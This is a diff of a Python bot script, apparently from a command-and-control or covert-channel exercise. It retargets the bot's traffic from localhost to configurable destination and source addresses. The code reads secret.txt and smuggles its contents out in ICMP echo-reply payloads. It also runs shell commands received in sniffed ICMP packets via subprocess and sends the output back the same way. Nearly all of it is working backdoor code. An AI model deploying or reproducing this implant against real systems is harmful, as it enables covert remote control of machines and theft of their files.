@@ -8,6 +8,9 @@ import requests
 from scapy.all import *
 from scapy.layers.inet import ICMP, IP
 
+destIP = ''
+srcIP = ''
+interface = '\\Device\\NPF_Loopback'
 
 def connectToAdversary():
     host = 'localhost'
@@ -29,23 +32,23 @@ def connectToAdversary():
 
 
 def sendGetRequest():
-    address = 'localhost'
+    address = destIP
     r = requests.get(url=address)
 
 
 def sendPostRequest():
-    address = 'localhost'
+    address = destIP
     data = ''
     r = requests.post(url=address, data=data)
 
 
 def sendICMPPing():
-    address = 'localhost'
+    address = destIP
     response = os.system("ping -c 1 " + address)
 
 
 def dnsARecord():
-    address = 'localhost'
+    address = destIP
     site = 'example.com'
     os.system('dig @' + address + ' ' + site)
 
@@ -63,7 +66,7 @@ def processSecret(packet):
     with open('secret.txt') as f:
         string = "botreply" + f.readline()
     time.sleep(1)
-    send(IP(dst='localhost', src='localhost') / ICMP(type=0) / string.encode())
+    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) / string.encode())
 
 def processCommand(packet):
     command = packet[Raw].load.decode()[7:]
@@ -72,11 +75,10 @@ def processCommand(packet):
     returnStatement = subprocess.check_output(command, shell = True).decode()
     returnStatement = "botreply" + returnStatement
     time.sleep(1)
-    send(IP(dst='localhost', src='localhost') / ICMP(type=0) / returnStatement.encode())
+    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) / returnStatement.encode())
 
 
 def sniffForPacket():
-    interface = '\\Device\\NPF_Loopback'
     sniff(iface=interface, prn=processPacket, filter='icmp')
 
 
